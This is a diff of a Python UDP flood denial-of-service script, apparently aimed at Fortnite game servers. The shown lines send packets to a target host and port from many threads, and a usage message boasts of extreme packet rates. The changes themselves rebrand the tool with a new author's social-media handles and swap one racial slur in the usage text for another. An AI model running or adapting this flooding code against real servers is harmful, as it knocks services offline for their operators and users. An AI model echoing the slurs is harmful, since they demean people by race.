@@ -1691,7 +1691,7 @@ def attack_fortigayserver(host, port, timer, pps, payload):
         s.sendto(b"Hello Friend", (str(host), int(port)))
         s.sendto(b"Hello Friend", (str(host), int(port)))
         s.sendto(b"Thank u for use it", (str(host), int(port)))
-        s.sendto(b"MY Insta : https://instagram.com/h04x_h04x", (str(host), int(port)))
+        s.sendto(b"MY Insta : https://instagram.com/xx_xwalidxx", (str(host), int(port)))
         s.sendto(b"My github page : https://github.com/black-hat-rgb", (str(host), int(port)))
         s.sendto(b"By Friend", (str(host), int(port)))
 
@@ -1716,7 +1716,7 @@ try:
         print(f'Thread [{i}] STarted')
         threading.Thread(target=attack_fortigayserver, args=(ip, port, times, pps, payloadfortnitejujujuju)).start()
 except IndexError:
-    print('Black Hat Rgb')
+    print('By WALIIIIIID')
     print('Method created by black-hat-rgb - https://github.com/black-hat-rgb')
-    print('Usage Nigger: sudo python3 FORTNITE-FLY.py <ip> <port> <threads> <time> <pps>')
+    print('Usage Nigga: sudo python3 FORTNITE-FLY.py <ip> <port> <threads> <time> <pps>')
     print('GOAT POWER = 100000000 PPS and 20000 THREADS')
